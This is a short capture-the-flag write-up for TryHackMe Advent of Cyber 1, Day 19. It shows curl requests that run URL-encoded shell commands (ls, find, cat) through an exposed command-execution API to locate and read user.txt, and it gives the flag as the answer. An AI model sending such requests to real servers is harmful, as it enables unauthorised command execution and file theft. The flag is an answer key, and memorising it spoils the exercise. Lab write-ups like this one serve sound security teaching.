# TryHackMe [Advent of Cyber 1](https://tryhackme.com/room/25daysofchristmas) Day 19
## What are the contents of the `user.txt` file?
1. Given the `/api/cmd/ls` endpoint, we get a JSON response which details typical `/`-level Linux directories:
```bash
$ curl http://<MACHINE_IP>:3000/api/cmd/ls
{"stdout":"bin\nboot\ndata\ndev\netc\nhome\nlib\nlib64\nlocal\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n","stderr":""}
```
2. A `find` command can be issued with space being encoded to `%20` and a `/` being  encoded to `%2f` in order to find the path of `user.txt`:
```bash
$ curl http://<MACHINE_IP>:3000/api/cmd/find%20%2f%20-name%20"user.txt"
{"stdout":"/home/bestadmin/user.txt\n","stderr":""}
```
3. A `cat` command can be issued with space being encoded to `%20` and a `/` being  encoded to `%2f` in order to print the content of `user.txt`:
```
$ curl http://<MACHINE_IP>:3000/api/cmd/cat%20home%2fbestadmin%2fuser.txt
{"stdout":"5W7WkjxBWwhe3RNsWJ3Q\n","stderr":""}
```

**Answer**: `5W7WkjxBWwhe3RNsWJ3Q`